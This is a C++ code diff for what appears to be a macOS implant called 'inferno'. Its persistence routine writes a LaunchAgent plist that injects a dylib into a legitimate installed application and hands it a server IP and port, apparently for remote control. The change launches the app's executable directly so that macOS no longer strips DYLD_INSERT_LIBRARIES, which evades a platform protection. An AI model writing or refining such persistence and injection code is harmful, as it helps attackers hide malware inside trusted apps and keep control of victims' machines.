@@ -541,15 +541,9 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
         return;
     }
 
-    // We're inside a real app — find the .app bundle root
-    // The executable is at .../Contents/MacOS/<name>; walk up to find the .app
-    auto pos = exec_path.find("/Contents/MacOS/");
-    if (pos == std::string::npos) return;
-    std::string app_bundle = exec_path.substr(0, pos);
-    // Get the .app directory name (e.g. "/Applications/DBeaver.app")
-    auto slash = app_bundle.rfind('/');
-    std::string app_display = (slash != std::string::npos)
-        ? app_bundle.substr(slash + 1) : app_bundle;
+    // We're inside a real app — the executable path is the target for launchd
+    // Use the executable directly (not /usr/bin/open -a) because modern macOS
+    // strips DYLD_INSERT_LIBRARIES when launched via LaunchServices.
 
     const char* home = ::getenv("HOME");
     if (!home) return;
@@ -575,8 +569,6 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
     <string>com.inferno.agent</string>
     <key>ProgramArguments</key>
     <array>
-        <string>/usr/bin/open</string>
-        <string>-a</string>
         <string>%s</string>
     </array>
     <key>EnvironmentVariables</key>
@@ -594,7 +586,7 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
     <false/>
 </dict>
 </plist>
-)", app_bundle.c_str(), dylib_path.c_str(),
+)", exec_path.c_str(), dylib_path.c_str(),
    server_ip.c_str(), port_str.c_str());
     ::fclose(f);
 }
